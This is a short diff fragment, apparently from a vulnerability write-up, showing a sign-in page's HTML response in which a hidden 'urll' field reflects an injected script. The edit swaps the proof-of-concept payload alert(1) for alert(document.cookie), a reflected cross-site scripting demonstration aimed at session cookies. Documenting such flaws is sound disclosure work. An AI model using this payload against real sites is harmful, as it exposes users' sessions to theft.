@@ -29,7 +29,7 @@ Response:
 <form name="form" action="signIn.do" method="post" onsubmit="return handleSubmit(this);">
  <input type="hidden" name="id" value="" />
  <input type="hidden" name="language" value="en" />
- <input type="hidden" name="urll" value=""><script>alert(1)</script>" />
+ <input type="hidden" name="urll" value=""><script>alert(document.cookie)</script>" />
  
 <div class="outer">
 ...
